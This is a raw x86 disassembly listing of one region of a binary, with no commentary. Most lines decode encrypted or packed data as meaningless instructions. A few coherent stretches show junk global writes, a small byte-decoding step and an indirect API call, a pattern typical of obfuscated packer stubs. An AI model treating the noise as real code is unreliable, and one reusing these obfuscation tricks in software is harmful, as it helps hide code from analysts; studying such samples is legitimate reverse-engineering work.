  404075:	add    eax,DWORD PTR [edi+0x3]
  404078:	icebp  
  404079:	test   BYTE PTR [ecx+0x5539cd01],bl
  40407f:	loop   0x4040f7
  404081:	or     esp,DWORD PTR [bx+di-0x68]
  404085:	nop
  404086:	test   DWORD PTR [esi+0x74f8c95f],0x7c1c0a1c
  404090:	(bad)  
  404091:	pop    esp
  404092:	into   
  404093:	lahf   
  404094:	lock popw ds
  404097:	dec    edx
  404098:	sub    esi,DWORD PTR [esi]
  40409a:	mov    DWORD PTR [ecx],edi
  40409c:	and    al,0x11
  40409e:	cwde   
  40409f:	aam    0x99
  4040a1:	mov    al,0xe5
  4040a3:	ret    0x4431
  4040a6:	and    al,0xc5
  4040a8:	out    0xf,al
  4040aa:	fwait
  4040ab:	(bad)  
  4040ac:	lods   eax,DWORD PTR ds:[esi]
  4040ad:	(bad)  
  4040ae:	adc    eax,0x47712a7d
  4040b3:	sbb    DWORD PTR [esi-0x72],0xb9a5beb3
  4040ba:	ret    0xa71a
  4040bd:	add    dh,dh
  4040bf:	push   edx
  4040c0:	jge    0x40408b
  4040c2:	sub    esi,DWORD PTR [ebp-0x358d7af8]
  4040c8:	adc    dh,BYTE PTR [eax]
  4040ca:	mov    esi,0xf878a6b3
  4040cf:	push   ds
  4040d0:	push   esi
  4040d1:	test   eax,0x81eb9167
  4040d6:	leave  
  4040d7:	(bad)  
  4040d8:	sbb    eax,0xc18b8116
  4040dd:	pop    ebp
  4040de:	ret    0x18
  4040e1:	push   ebp
  4040e2:	mov    ebp,esp
  4040e4:	sub    esp,0x58
  4040e7:	xor    DWORD PTR ds:0x433633,0x2c9d
  4040f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4040f4:	sbb    eax,DWORD PTR ds:0x433673
  4040fa:	mov    eax,0x8a3a
  4040ff:	sub    DWORD PTR ds:0x4335ab,0x44c4
  404109:	xor    ax,WORD PTR [ecx+0x20]
  40410d:	sub    ecx,0x3d49
  404113:	mov    ecx,0x3b00
  404118:	xor    DWORD PTR ds:0x433547,0x649a
  404122:	add    ax,cx
  404125:	movzx  eax,ax
  404128:	mov    DWORD PTR [ebp-0xc],eax
  40412b:	mov    ecx,DWORD PTR ds:0x43365b
  404131:	and    DWORD PTR ds:0x433627,ecx
  404137:	mov    BYTE PTR [ebp-0x1],0x7f
  40413b:	sub    ecx,0x46a5
  404141:	lea    eax,[ebp-0x1]
  404144:	mov    DWORD PTR [ebp-0x10],eax
  404147:	adc    DWORD PTR ds:0x43353f,ecx
  40414d:	mov    al,BYTE PTR [ebp-0x1]
  404150:	movzx  ecx,WORD PTR ds:0x433543
  404157:	or     ecx,DWORD PTR ds:0x433597
  40415d:	mov    DWORD PTR ds:0x433543,ecx
  404163:	mov    ecx,DWORD PTR [ebp-0x10]
  404166:	xor    al,0x45
  404168:	sub    DWORD PTR ds:0x4335f3,0x7f5e
  404172:	sub    al,0x39
  404174:	mov    BYTE PTR [ecx],al
  404176:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40417d:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  404184:	add    DWORD PTR ds:0x43365b,ebx
  40418a:	mov    eax,DWORD PTR [ebp-0x8]
  40418d:	sbb    ecx,0x3751
  404193:	mov    ecx,0x7510853
  404198:	jmp    0x40436a
  40419d:	mov    ds,ebp
  40419f:	inc    eax
  4041a0:	add    DWORD PTR [ebx-0x6f],0x1318dd55
  4041a7:	and    edx,esp
  4041a9:	push   edx
  4041aa:	pop    esi
  4041ab:	mov    esp,0x7c24a80f
  4041b0:	jl     0x40415d
  4041b2:	jg     0x404230
  4041b4:	jl     0x40415f
  4041b6:	retf   0x9e4c
  4041b9:	sub    DWORD PTR ds:0xfeff8186,ecx
  4041bf:	dec    esi
  4041c0:	mov    ebx,0x62c6be8d
  4041c5:	xchg   esi,eax
  4041c6:	scas   eax,DWORD PTR es:[edi]
  4041c7:	stc    
  4041c8:	xchg   edx,eax
  4041c9:	or     DWORD PTR ds:0x8b15560b,ebx
  4041cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041d0:	in     eax,0x72
  4041d2:	mov    dh,0xc3
  4041d4:	or     DWORD PTR [esi],0xaab57271
  4041da:	ss xchg esp,eax
  4041dc:	std    
  4041dd:	mov    esi,0xf9ebe384
  4041e2:	dec    esi
  4041e3:	sbb    al,0x8c
  4041e5:	jecxz  0x4041e0
  4041e7:	call   0xbc29:0xe65870e8
  4041ee:	arpl   bp,sp
  4041f0:	rol    DWORD PTR [esi],0x46
  4041f3:	ja     0x404202
  4041f5:	out    0xba,al
  4041f7:	add    DWORD PTR [edi-0x1a],0x29509674
  4041fe:	test   eax,0xc300ec07
  404203:	cmp    ch,BYTE PTR [edi*8+0x53db23b6]
  40420a:	add    al,0xb7
  40420c:	push   esi
  40420d:	cmp    esi,ecx
  40420f:	lods   al,BYTE PTR ds:[esi]
  404210:	inc    ebx
  404211:	sub    DWORD PTR [eax+eax*8-0x2c],ebp
  404215:	scas   al,BYTE PTR es:[edi]
  404216:	mov    eax,ds:0xe84a0287
  40421b:	sahf   
  40421c:	mov    al,ds:0xc82ba31b
  404221:	adc    eax,0xce9263c9
  404226:	scas   al,BYTE PTR es:[edi]
  404227:	xchg   ebp,eax
  404228:	dec    edx
  404229:	add    al,0x68
  40422b:	scas   eax,DWORD PTR es:[edi]
  40422c:	mov    esp,0xea7b77ea
  404231:	mov    esi,0xa8f38c56
  404236:	jns    0x404247
  404238:	pusha  
  404239:	retf   
  40423a:	push   0x8b6e5f1d
  40423f:	std    
  404240:	mov    al,ds:0x5c9bbc68
  404245:	call   0xf7dc:0x6c03c1a7
  40424c:	inc    esi
  40424d:	std    
  40424e:	lods   eax,DWORD PTR ds:[esi]
  40424f:	mov    esp,0x61de5ab0
  404254:	dec    eax
  404255:	dec    ebp
  404256:	or     eax,0xf34d6230
  40425b:	xor    BYTE PTR [edi-0xc],cl
  40425e:	pop    edi
  40425f:	inc    esp
  404260:	call   0xc82fdf29
  404265:	dec    edx
  404266:	out    dx,al
  404267:	aad    0x60
  404269:	enter  0x8fe6,0xb6
  40426d:	ins    BYTE PTR es:[edi],dx
  40426e:	add    al,0x5b
  404270:	out    dx,al
  404271:	xchg   esp,eax
  404272:	inc    edi
  404273:	int3   
  404274:	lods   al,BYTE PTR ds:[esi]
  404275:	dec    edx
  404276:	cld    
  404277:	fwait
  404278:	aaa    
  404279:	cmc    
  40427a:	js     0x4042ab
  40427c:	mov    edx,esi
  40427e:	and    DWORD PTR [edx-0x63e2c2f6],ecx
  404284:	lea    ecx,[ebx-0x1b]
  404287:	adc    ecx,ebp
  404289:	into   
  40428a:	pop    es
  40428b:	dec    ebp
  40428c:	leave  
  40428d:	mov    ds,WORD PTR [edx]
  40428f:	mov    edi,0x52ac95a1
  404294:	(bad)  
  404295:	mov    WORD PTR [esi+0x44be054],cs
  40429b:	cmp    eax,0xa966d782
  4042a0:	aam    0x5c
  4042a2:	out    dx,eax
  4042a3:	(bad)  
  4042a4:	into   
  4042a5:	adc    ebp,DWORD PTR [esi-0x514cc99b]
  4042ab:	stc    
  4042ac:	or     al,0x1e
  4042ae:	jecxz  0x40432d
  4042b0:	test   BYTE PTR [edx+edi*8-0x46],0x78
  4042b5:	and    BYTE PTR [esi-0x4c00b9a],dl
  4042bb:	pop    edi
  4042bc:	xor    BYTE PTR [ebp+0x35a9b2fe],ah
  4042c2:	sbb    eax,ecx
  4042c4:	(bad)  
  4042c6:	add    eax,0xfede55b1
  4042cb:	arpl   ax,bp
  4042cd:	pop    esi
  4042ce:	dec    esp
  4042cf:	stos   DWORD PTR es:[edi],eax
  4042d0:	and    ah,BYTE PTR [ebp+0x5ca8be4e]
  4042d6:	(bad)
  4042d9:	lds    ecx,FWORD PTR [esi-0x12]
  4042dc:	jb     0x404274
  4042de:	shr    DWORD PTR [ebx],0xad
  4042e1:	fidivr DWORD PTR [edx+0x65]
  4042e4:	jns    0x4042ad
  4042e6:	xor    edi,edi
  4042e8:	fwait
  4042e9:	xchg   esp,eax
  4042ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042eb:	jmp    0xd7e768b
  4042f0:	iret   
  4042f1:	mov    DWORD PTR ss:[ebx+0x2f953dd],edx
  4042f8:	mov    al,0x32
  4042fa:	xchg   DWORD PTR [edx],edx
  4042fc:	push   ecx
  4042fd:	mov    ebx,0x401a4f9d
  404302:	sbb    DWORD PTR ds:[ebx],edx
  404305:	and    eax,0x9833d46e
  40430a:	test   DWORD PTR [edi-0x73],0x234f7d67
  404311:	push   ebx
  404312:	jae    0x40435d
  404314:	pop    esp
  404315:	outs   dx,BYTE PTR ds:[esi]
  404316:	aaa    
  404317:	sub    eax,0x55570745
  40431c:	and    dh,BYTE PTR [edx-0x221ba630]
  404322:	jmp    0xdfa1:0x9e8de774
  404329:	(bad)  
  40432a:	ficomp WORD PTR ds:0x2f79647a
  404330:	mov    esi,0x3f5f1fd0
  404335:	pop    ds
  404336:	cwde   
  404337:	mov    eax,ds:0xcd9e3871
  40433c:	pop    ecx
  40433d:	(bad)  
  40433e:	xlat   BYTE PTR ds:[ebx]
  40433f:	ja     0x404377
  404341:	pop    ebp
  404342:	sub    BYTE PTR [ecx-0x68],bh
  404345:	(bad)  
  404346:	push   cs
  404347:	inc    eax
  404348:	add    eax,edi
  40434a:	rol    BYTE PTR [ebx+0x6249aae3],0xb2
  404351:	dec    esp
  404352:	shl    dh,0x2d
  404355:	cli    
  404356:	(bad)  
  404357:	out    dx,eax
  404358:	imul   ebx,DWORD PTR [esi+edi*1+0x68317723],0x9c1d7699
  404363:	stc    
  404364:	mov    cl,0xe0
  404366:	jmp    0x56b50804
  40436b:	or     DWORD PTR ds:0x43361f,0x4643
  404375:	xor    eax,ecx
  404377:	add    DWORD PTR ds:0x43362f,0x1b4e
  404381:	mov    esi,0x32729a
  404386:	or     DWORD PTR ds:0x43362f,0x4335ef
  404390:	jmp    0x404562
  404395:	sub    ecx,DWORD PTR [edx]
  404397:	mov    esi,DWORD PTR [ebx-0x6dcc424b]
  40439d:	mov    cl,0x88
  40439f:	cmp    BYTE PTR [ecx],bh
  4043a1:	sbb    DWORD PTR [eax+0x26e728df],esp
  4043a7:	jl     0x404425
  4043a9:	stos   DWORD PTR es:[edi],eax
  4043aa:	jg     0x404428
  4043ac:	jl     0x4043a8
  4043ae:	into   
  4043af:	inc    ebp
  4043b0:	adc    DWORD PTR [esi],edi
  4043b2:	ss (bad) 
  4043b4:	sti    
  4043b5:	and    DWORD PTR gs:[esi],eax
  4043b8:	push   edx
  4043b9:	xchg   esi,eax
  4043ba:	ret    
  4043bb:	aas    
  4043bc:	or     al,0x1a
  4043be:	js     0x404390
  4043c0:	jne    0x404397
  4043c2:	scas   eax,DWORD PTR es:[edi]
  4043c3:	jecxz  0x404399
  4043c5:	pop    ecx
  4043c6:	int    0x60
  4043c8:	xchg   edx,eax
  4043c9:	leave  
  4043ca:	dec    ecx
  4043cb:	out    0x6c,eax
  4043cd:	aam    0xa7
  4043cf:	fistp  DWORD PTR [esi+0x7f743e6f]
  4043d5:	adc    DWORD PTR [esi],edx
  4043d7:	xor    al,0x6a
  4043d9:	lock aad 0x20
  4043dc:	int    0x92
  4043de:	push   cs
  4043df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043e0:	sub    bh,bl
  4043e2:	jns    0x404399
  4043e4:	mov    esi,0x13aecf28
  4043e9:	std    
  4043ea:	aam    0x3e
  4043ec:	mov    esp,esp
  4043ee:	mov    al,ds:0x24e83fc6
  4043f3:	sub    BYTE PTR [ecx],0x42
  4043f6:	cwde   
  4043f7:	jg     0x4043ea
  4043f9:	push   edi
  4043fa:	mov    ebp,0x1eb1ea84
  4043ff:	cs push es
  404401:	ss shl ecx,1
  404404:	mov    ebp,0x4d399e39
  404409:	in     eax,dx
  40440a:	stos   BYTE PTR es:[edi],al
  40440b:	cdq    
  40440c:	dec    eax
  40440d:	push   0x7827dfe5
  404412:	ja     0x4043af
  404414:	mov    WORD PTR [eax+0xcf3a89a],gs
  40441a:	repz sub DWORD PTR [eax-0x66],ecx
  40441e:	inc    ebp
  40441f:	cmc    
  404420:	mov    ecx,ecx
  404422:	mov    ebx,0x4dd19163
  404427:	inc    esi
  404428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404429:	jp     0x404429
  40442b:	inc    esp
  40442c:	or     BYTE PTR [edi+eiz*4],dh
  40442f:	and    eax,0x22cf45e3
  404434:	sbb    BYTE PTR [esi-0x4bf9f488],bl
  40443a:	sbb    dh,BYTE PTR [ebp+0x4a]
  40443d:	pop    edx
  40443e:	dec    ebx
  40443f:	lahf   
  404440:	inc    esi
  404441:	jno    0x404432
  404443:	nop
  404444:	shr    BYTE PTR [edi],0xec
  404447:	repz jmp 0x90d0:0x750d636b
  40444f:	ror    BYTE PTR [ecx+0x5de74729],1
  404455:	imul   eax,DWORD PTR [eax],0x32928b60
  40445b:	cmp    al,0xaa
  40445d:	(bad)  
  40445e:	mov    ebp,0x7980133a
  404463:	xchg   ebp,eax
  404464:	es xchg esp,eax
  404466:	sbb    al,0x5a
  404468:	sbb    eax,0x7d3c25
  40446d:	mov    gs,WORD PTR [eax-0x249b4f9a]
  404473:	sahf   
  404474:	aad    0xeb
  404476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404477:	loop   0x404429
  404479:	mov    bh,BYTE PTR [esi-0x213b8e80]
  40447f:	cli    
  404480:	aad    0xcc
  404482:	push   edi
  404483:	mov    esi,DWORD PTR [edi-0x62a7dcbb]
  404489:	xor    ebp,esi
  40448b:	sub    cl,BYTE PTR [edi]
  40448d:	mov    eax,ds:0xa547f2ad
  404492:	sub    al,0x5c
  404494:	inc    ebx
  404495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404496:	mov    ebx,0xdddd3a58
  40449c:	dec    esi
  40449d:	or     dl,al
  40449f:	mov    esi,0x5bb0d572
  4044a4:	ins    DWORD PTR es:[edi],dx
  4044a5:	jo     0x4044d4
  4044a7:	fmul   QWORD PTR [edi+0x3b21aaae]
  4044ad:	jae    0x404468
  4044af:	push   esp
  4044b0:	mov    BYTE PTR gs:[ebx+0xd75526b],0x2c
  4044b8:	add    dh,ah
  4044ba:	mov    dl,0xb8
  4044bc:	or     eax,0xbecb9c8b
  4044c1:	jae    0x40452d
  4044c3:	jp     0x404489
  4044c5:	push   ebp
  4044c6:	sbb    al,0xd
  4044c8:	rcl    DWORD PTR [eax-0x1a],1
  4044cb:	jmp    0x4462:0xfafe589e
  4044d2:	sbb    BYTE PTR [eax+eiz*2-0x509a583f],cl
  4044d9:	dec    ebx
  4044da:	loopne 0x40448c
  4044dc:	cdq    
  4044dd:	(bad)  
  4044de:	jbe    0x404475
  4044e0:	les    ebp,FWORD PTR [ebx+0x5f]
  4044e3:	std    
  4044e4:	(bad)  
  4044e5:	push   ebp
  4044e6:	jl     0x404495
  4044e8:	loopne 0x404483
  4044ea:	cmp    al,0xf9
  4044ec:	(bad)  
  4044ed:	mov    dl,0x59
  4044ef:	shl    edx,1
  4044f1:	das    
  4044f2:	mov    esp,eax
  4044f4:	jecxz  0x4044ba
  4044f6:	adc    edx,DWORD PTR [ebp-0x4f0b8311]
  4044fc:	adc    al,0x57
  4044fe:	stos   DWORD PTR es:[edi],eax
  4044ff:	sub    cl,BYTE PTR es:[ebx+0x7e]
  404503:	(bad)  
  404504:	pop    esi
  404505:	mov    cl,0x53
  404507:	repnz inc ebx
  404509:	pop    ss
  40450a:	test   al,0xf3
  40450c:	xchg   ebp,eax
  40450d:	ficomp WORD PTR [eax]
  40450f:	mov    al,ds:0xf7fb8560
  404514:	add    eax,0xca928493
  404519:	mov    ebp,0x9144c13a
  40451e:	leave  
  40451f:	and    BYTE PTR [eax],bh
  404521:	jns    0x404557
  404523:	mov    bh,0x81
  404525:	mov    bl,0xb1
  404527:	mov    cl,dl
  404529:	sub    eax,0x2585fee3
  40452e:	mov    ah,0x1
  404530:	pop    eax
  404531:	jo     0x404558
  404533:	push   esi
  404534:	mov    edi,0x22912992
  404539:	(bad)  
  40453a:	aas    
  40453b:	or     eax,0xf913f301
  404540:	inc    eax
  404541:	(bad)  
  404542:	mov    ds:0x17e089ef,eax
  404547:	and    dl,cl
  404549:	dec    ecx
  40454a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40454b:	cmp    esi,esp
  40454d:	mov    al,0x41
  40454f:	push   edx
  404550:	pop    ecx
  404551:	popa   
  404552:	push   edi
  404553:	inc    eax
  404554:	jmp    0x5c86:0x511376da
  40455b:	pop    esi
  40455c:	jne    0x404540
  40455e:	pop    ecx
  40455f:	shl    DWORD PTR [edi-0x29],0x3
  404563:	(bad)  
  404564:	jmp    0x404757
  404569:	mov    DWORD PTR ds:0x4335a7,0x6267
  404573:	mov    dl,BYTE PTR [ebp-0x1]
  404576:	mov    DWORD PTR ds:0x433553,0x1c06
  404580:	jmp    0x404752
  404585:	rol    DWORD PTR [edx+edi*1],cl
  404588:	push   ss
  404589:	aad    0xd2
  40458b:	ror    ebp,cl
  40458d:	mov    eax,0xac2aa9d
  404592:	out    0xc8,al
  404594:	and    edx,DWORD PTR [edx]
  404596:	and    BYTE PTR [esp+edi*2-0x55],bh
  40459a:	jg     0x404618
  40459c:	jl     0x404616
  40459e:	xor    BYTE PTR [ebp-0x421c1524],0x69
  4045a5:	xchg   ebp,eax
  4045a6:	pop    esp
  4045a7:	cmp    BYTE PTR [ebx],dh
  4045a9:	ud1    edi,DWORD PTR [ebx-0x7f]
  4045ad:	(bad)  
  4045ae:	nop
  4045af:	or     al,0xc
  4045b1:	sub    al,0x40
  4045b3:	push   0x3bf1bbd0
  4045b8:	add    esi,eax
  4045ba:	push   eax
  4045bb:	sub    ah,BYTE PTR [eax]
  4045bd:	stos   BYTE PTR es:[edi],al
  4045be:	and    DWORD PTR [ecx],0x1071b5dc
  4045c4:	mov    dh,0xa0
  4045c6:	mov    edi,0x3d447de4
  4045cb:	sbb    edx,ebx
  4045cd:	test   DWORD PTR [edi],0xcd0100d9
  4045d3:	rol    bh,0x33
  4045d6:	xor    eax,0x4a3f484a
  4045db:	aas    
  4045dc:	call   0xb5dc515
  4045e1:	jecxz  0x404597
  4045e3:	push   0xcf218632
  4045e8:	clc    
  4045e9:	push   edi
  4045ea:	xchg   esp,eax
  4045eb:	retf   
  4045ec:	inc    eax
  4045ed:	mov    bh,0x59
  4045ef:	aad    0x47
  4045f1:	jge    0x40460f
  4045f3:	sbb    ecx,ebx
  4045f5:	mov    esp,DWORD PTR [eax-0x49353551]
  4045fb:	push   edx
  4045fc:	push   es
  4045fd:	mov    ah,0xf0
  4045ff:	cmp    al,0xf9
  404601:	retf   
  404602:	loop   0x404672
  404604:	retf   0x4931
  404607:	push   edi
  404608:	sub    DWORD PTR [edx-0x60],eax
  40460b:	aam    0x2
  40460d:	add    edi,DWORD PTR [ebp+0x8]
  404610:	dec    eax
  404611:	jbe    0x4045d8
  404613:	adc    edi,esp
  404615:	mov    ds:0xd36423d1,al
  40461a:	xchg   ebx,eax
  40461b:	inc    edx
  40461c:	shr    DWORD PTR [ecx],0x6e
  40461f:	push   edi
  404620:	and    BYTE PTR [edi+0x3a],cl
  404623:	cdq    
  404624:	ret    0x9a2f
  404627:	fdivr  QWORD PTR [ecx]
  404629:	dec    DWORD PTR ds:0x2e303236
  40462f:	lea    edx,[ebx]
  404631:	cli    
  404632:	scas   al,BYTE PTR es:[edi]
  404633:	aaa    
  404634:	loopne 0x4045e8
  404636:	cdq    
  404637:	nop
  404638:	shr    ecx,cl
  40463a:	cmp    al,BYTE PTR [edx]
  40463c:	imul   edi,DWORD PTR [ebx-0x29],0x75
  404640:	dec    esi
  404641:	out    dx,eax
  404642:	das    
  404643:	scas   al,BYTE PTR es:[edi]
  404644:	repnz adc DWORD PTR [esi+0xb761db7],esi
  40464b:	pushf  
  40464c:	sub    eax,0xf5dbd005
  404651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404652:	(bad)  
  404653:	leave  
  404654:	mov    dl,0x7d
  404656:	call   0x3d9b413
  40465b:	nop
  40465c:	imul   bh
  40465e:	mov    WORD PTR [ebx-0x54673990],?
  404664:	call   0x8928:0xe1eb4b2
  40466b:	mov    al,ds:0xcbc26260
  404670:	es dec ebp
  404672:	mov    eax,0x3a8875a0
  404677:	mov    eax,0xb4d6bdad
  40467c:	aas    
  40467d:	(bad)  
  40467e:	fwait
  40467f:	jnp    0x4046e8
  404681:	lahf   
  404682:	(bad)  
  404683:	cld    
  404684:	xor    ch,dh
  404686:	pop    ebp
  404687:	adc    al,0xb
  404689:	ins    DWORD PTR es:[edi],dx
  40468a:	js     0x4046a7
  40468c:	push   ecx
  40468d:	xor    al,0xdb
  40468f:	in     eax,0x6
  404691:	inc    edi
  404692:	fsub   QWORD PTR ds:0xd3c89091
  404698:	fs xor edi,0x335aa971
  40469f:	leave  
  4046a0:	iret   
  4046a1:	cmp    bl,BYTE PTR [edx-0x12]
  4046a4:	mov    ch,0x1f
  4046a6:	out    dx,al
  4046a7:	cmp    edx,edi
  4046a9:	iret   
  4046aa:	xchg   ecx,eax
  4046ab:	std    
  4046ac:	inc    esi
  4046ad:	(bad)  
  4046ae:	repz data16 shl BYTE PTR [eax+0x68],0xbb
  4046b4:	xor    al,0xbe
  4046b6:	dec    edi
  4046b7:	push   0x27
  4046b9:	or     cl,BYTE PTR [edi+0x42]
  4046bc:	ins    DWORD PTR es:[edi],dx
  4046bd:	add    BYTE PTR [esi-0x25e6265],cl
  4046c3:	sub    esi,DWORD PTR [ecx-0x6d]
  4046c6:	mov    eax,0xd4c19327
  4046cb:	or     BYTE PTR [ebx+ebx*2],ah
  4046ce:	enter  0x716b,0x6f
  4046d2:	daa    
  4046d3:	(bad)  
  4046d4:	dec    edi
  4046d5:	and    al,0xfc
  4046d7:	mov    esp,0xb4b47980
  4046dc:	sets   BYTE PTR [eax+0xa9ddf43]
  4046e3:	stos   DWORD PTR es:[edi],eax
  4046e4:	mov    ecx,0xd3fc4fd2
  4046e9:	cs or  edx,ebx
  4046ec:	dec    ebx
  4046ed:	dec    esi
  4046ee:	hlt    
  4046ef:	inc    esp
  4046f0:	sub    eax,0x97eb98f1
  4046f5:	xlat   BYTE PTR ds:[ebx]
  4046f6:	arpl   WORD PTR [ecx+0x74],bx
  4046f9:	mov    dl,0x1f
  4046fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046fc:	fstp   QWORD PTR [esi+eiz*4+0x57]
  404700:	sbb    ch,BYTE PTR [eax+ebp*1+0x7325d64d]
  404707:	mov    ebp,0xe7e9a2bd
  40470c:	mov    bl,0x51
  40470e:	test   BYTE PTR ds:0x73897749,ah
  404714:	jbe    0x4046b8
  404716:	xchg   edx,eax
  404717:	aam    0xf1
  404719:	dec    esi
  40471a:	aas    
  40471b:	lock pop eax
  40471d:	push   ss
  40471e:	cmc    
  40471f:	ret    0x70e4
  404722:	pop    eax
  404723:	inc    edi
  404724:	adc    DWORD PTR [edx-0x3a],esp
  404727:	sub    eax,0x99477886
  40472c:	retf   
  40472d:	jne    0x404749
  40472f:	fdivr  QWORD PTR [edx]
  404731:	retf   0xa7e7
  404734:	shl    BYTE PTR [esi+0x47],0x59
  404738:	retf   
  404739:	jmp    0x4750:0x278008ef
  404740:	sar    DWORD PTR [ebp+0xce14629],1
  404746:	call   0xb192:0x40e013ce
  40474d:	jno    0x404717
  40474f:	xchg   edi,eax
  404750:	dec    ecx
  404751:	ror    BYTE PTR [eax+0x40a80554],cl
  404757:	mov    DWORD PTR ds:0x43354f,0xde3
  404761:	cmp    eax,0x40
  404764:	jb     0x404569
  40476a:	sub    eax,DWORD PTR ds:0x433657
  404770:	mov    edx,DWORD PTR [ebp-0x8]
  404773:	mov    DWORD PTR ds:0x43353f,0x14
  40477d:	cmp    DWORD PTR ds:0x43353f,0x0
  404784:	je     0x4047dd
  40478a:	cmp    DWORD PTR ds:0x43353f,0xa
  404791:	jne    0x4047ab
  404797:	push   DWORD PTR [ebp-0x24]
  40479a:	push   DWORD PTR [ebp-0xc]
  40479d:	push   0x42f8
  4047a2:	push   DWORD PTR [ebp-0x24]
  4047a5:	call   DWORD PTR ds:0x4120bc
  4047ab:	cmp    DWORD PTR ds:0x43353f,0xb
  4047b2:	jne    0x4047c3
  4047b8:	mov    eax,ds:0x43353f
  4047bd:	dec    eax
  4047be:	mov    ds:0x43353f,eax
  4047c3:	mov    eax,ds:0x43353f
  4047c8:	dec    eax
  4047c9:	mov    ds:0x43353f,eax
  4047ce:	jmp    0x40477d
  4047d3:	or     DWORD PTR ds:0x4335e3,0x7ef0
  4047dd:	mov    eax,DWORD PTR [ebp-0xc]
  4047e0:	xor    edx,ecx
  4047e2:	xor    DWORD PTR ds:0x4335d7,0x43366f
  4047ec:	add    edx,esi
  4047ee:	cmp    edx,eax
  4047f0:	mov    DWORD PTR ds:0x4335db,0x5bbb
  4047fa:	je     0x404a4f
  404800:	sbb    DWORD PTR ds:0x4335e7,edi
  404806:	push   ebx
  404807:	or     DWORD PTR ds:0x4335f3,ebx
  40480d:	jmp    0x4049df
  404812:	and    eax,0xfd09dbf4
  404817:	sbb    eax,0xea31f0f5
  40481c:	push   edx
  40481d:	loope  0x404821
  40481f:	fisub  DWORD PTR [ebx]
  404821:	or     BYTE PTR [ecx+0x23],0x7c
  404825:	jl     0x4047d2
  404827:	jg     0x4048a5
  404829:	jl     0x4047f0
  40482b:	jno    0x404877
  40482d:	mov    eax,ss:0x86b12886
  404833:	fimul  DWORD PTR [edx-0x7e923579]
  404839:	cwde   
  40483a:	jb     0x40481c
  40483c:	mov    esi,0x2b33693a
  404841:	cld    
  404842:	loopne 0x4048c2
  404844:	xchg   ebx,eax
  404845:	std    
  404846:	cmp    eax,0x9283cb87
  40484b:	sub    al,0x80
  40484d:	inc    edi
  40484e:	daa    
  40484f:	mov    ebx,0xd3b2f16e
  404854:	adc    DWORD PTR [esi+0x12],esi
  404857:	sbb    BYTE PTR [edi-0x6146c55c],0x66
  40485e:	shr    DWORD PTR [ebx],1
  404860:	aas    
  404861:	ss cwde 
  404863:	int3   
  404864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404865:	into   
  404866:	mov    dl,0x4f
  404868:	mov    dl,0x96
  40486a:	xor    BYTE PTR ds:0x4c9d5038,dh
  404870:	add    ch,BYTE PTR [edi]
  404872:	dec    esi
  404873:	ficom  DWORD PTR [esi-0xf]
  404876:	add    DWORD PTR [esi],0x69846a77
  40487c:	push   ds
  40487d:	push   cs
  40487e:	sub    al,0xb9
  404880:	add    BYTE PTR [eax],0xa1
  404883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404884:	stc    
  404885:	jnp    0x404834
  404887:	add    ecx,DWORD PTR [ecx+0x3a]
  40488a:	leave  
  40488b:	arpl   WORD PTR [eax+0x7d52eebe],cx
  404891:	inc    eax
  404892:	mov    BYTE PTR [ebx],al
  404894:	sbb    esp,DWORD PTR [eax+edx*2-0x67eb9a10]
  40489b:	add    DWORD PTR [ebx],0x75562e9f
  4048a1:	or     al,0x7f
  4048a3:	fidivr DWORD PTR [ebp+0x53001fc7]
  4048a9:	test   DWORD PTR [ecx+ebx*1+0x26],0x26928c9b
  4048b1:	les    edi,FWORD PTR [ebp+edi*8+0x42]
  4048b5:	xor    esi,DWORD PTR [ebp-0x56]
  4048b8:	rcl    BYTE PTR [ecx],0x3a
  4048bb:	enter  0xfd7d,0x8d
  4048bf:	fnstenv [esi]
  4048c1:	jecxz  0x404847
  4048c3:	cmc    
  4048c4:	jl     0x4048f9
  4048c6:	sahf   
  4048c7:	xor    BYTE PTR ds:0x4808116c,bl
  4048cd:	and    DWORD PTR [esi+0x2a],eax
  4048d0:	push   ebx
  4048d1:	icebp  
  4048d2:	inc    eax
  4048d3:	inc    ebx
  4048d4:	or     BYTE PTR [edi-0x42440118],0x79
  4048db:	hlt    
  4048dc:	(bad)  
  4048dd:	xchg   esp,eax
  4048de:	mov    ecx,0xc3a1906f
  4048e3:	lods   al,BYTE PTR ds:[esi]
  4048e4:	xor    DWORD PTR [ebp-0x53],edx
  4048e7:	das    
  4048e8:	ins    DWORD PTR es:[edi],dx
  4048e9:	lea    edx,[ebx+0x76b0b024]
  4048ef:	not    cl
  4048f1:	retf   
  4048f2:	jp     0x404889
  4048f4:	fnstcw WORD PTR [edx+0x4]
  4048f7:	nop
  4048f8:	outs   dx,BYTE PTR ds:[esi]
  4048f9:	mov    DWORD PTR [esi+eiz*4-0x669aed39],eax
  404900:	cld    
  404901:	xor    esp,DWORD PTR [eax-0x1f9e0554]
  404907:	bound  ebx,QWORD PTR cs:[eax]
  40490a:	cmp    BYTE PTR [edx+0x6bc02248],0x2f
  404911:	sti    
  404912:	scas   eax,DWORD PTR es:[edi]
  404913:	rol    DWORD PTR [ecx+0x59c9d649],0xe3
  40491a:	push   edx
  40491b:	xchg   esi,eax
  40491c:	mov    eax,0x472f7777
  404921:	adc    al,0x29
  404923:	lds    edi,FWORD PTR [edi*4+0x38624cf4]
  40492a:	enter  0xef00,0xe6
  40492e:	lahf   
  40492f:	xchg   edi,eax
  404930:	std    
  404931:	call   0x3df889c
  404936:	push   es
  404937:	adc    BYTE PTR [ebx],0xfe
  40493a:	dec    ax
  40493c:	in     eax,dx
  40493d:	imul   DWORD PTR [esi+0x11]
  404940:	add    esi,DWORD PTR [edx-0x4016caa2]
  404946:	nop
  404947:	push   eax
  404948:	push   es
  404949:	sbb    DWORD PTR [eax+0x2d],ecx
  40494c:	imul   esp,DWORD PTR [ebp+0x74b319af],0x2e
